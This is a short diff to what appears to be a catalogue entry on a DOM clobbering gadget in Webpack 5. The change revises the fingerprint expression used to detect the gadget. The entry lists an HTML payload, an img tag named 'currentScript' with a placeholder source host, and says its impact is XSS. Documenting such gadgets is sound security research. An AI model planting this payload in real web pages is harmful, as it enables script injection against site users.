@@ -4,7 +4,7 @@
 
 + Library: Webpack
 + Version: 5
-+ Fingerprint: `__webpack_require__ && 'p' in __webpack_require__`
++ Fingerprint: `typeof __webpack_require__ !== 'undefined' && __webpack_require__.hasOwnProperty('p')`
 + Payload: ```<img name="currentScript" src="https://xxx.xxxx.xxx"></img>```
 + Impact: XSS
 + Foundby: TheHulk
